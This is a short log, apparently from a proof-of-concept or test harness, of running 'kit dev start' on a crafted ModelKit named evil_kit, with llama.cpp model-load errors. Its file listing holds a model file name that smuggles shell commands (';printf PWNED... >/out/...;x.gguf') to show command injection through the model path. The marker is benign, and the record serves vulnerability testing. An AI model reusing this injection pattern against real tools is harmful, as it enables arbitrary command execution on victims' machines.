@@ -1,0 +1,24 @@
+$ kit dev start /artifact/evil_kit --port 18083
+--- stdout ---
+Loaded Kitfile: /artifact/evil_kit/Kitfile
+Development server started at http://127.0.0.1:18083
+Use "kit dev stop" to stop the development server
+
+--- stderr ---
+
+--- harness.log ---
+note: if you have an AMD or NVIDIA GPU then you need to pass -ngl 9999 to enable GPU offloading
+{"build":1500,"commit":"a30b324","function":"server_cli","level":"INFO","line":2898,"msg":"build info","tid":"11808320","timestamp":1789913096}
+{"function":"server_cli","level":"INFO","line":2905,"msg":"system info","n_threads":20,"n_threads_batch":192,"system_info":"AVX = 1 | AVX_VNNI = 0 | AVX2 = 1 | AVX512 = 1 | AVX512_VBMI = 1 | AVX512_VNNI = 1 | AVX512_BF16 = 1 | FMA = 1 | NEON = 0 | SVE = 0 | ARM_FMA = 0 | F16C = 1 | FP16_VA = 0 | WASM_SIMD = 0 | BLAS = 0 | SSE3 = 1 | SSSE3 = 1 | VSX = 0 | MATMUL_INT8 = 0 | LLAMAFILE = 1 | ","tid":"11808320","timestamp":1789913096,"total_threads":384}
+llama_model_load: error loading model: failed to open /artifact/evil_kit/models/: Is a directory
+llama_load_model_from_file: failed to load model
+llama_init_from_gpt_params: error: failed to load model '/artifact/evil_kit/models/'
+{"function":"load_model","level":"ERR","line":463,"model":"/artifact/evil_kit/models/","msg":"unable to load model","tid":"11808320","timestamp":1789913096}
+sh: 1: x.gguf: not found
+
+--- modelkit tree ---
+/artifact/evil_kit/Kitfile
+/artifact/evil_kit/models
+/artifact/evil_kit/models/;printf PWNED_BY_W11_KITOPS_KITFILE >
+/artifact/evil_kit/models/;printf PWNED_BY_W11_KITOPS_KITFILE >/out
+/artifact/evil_kit/models/;printf PWNED_BY_W11_KITOPS_KITFILE >/out/pwned_by_w11_kitops_kitfile;x.gguf
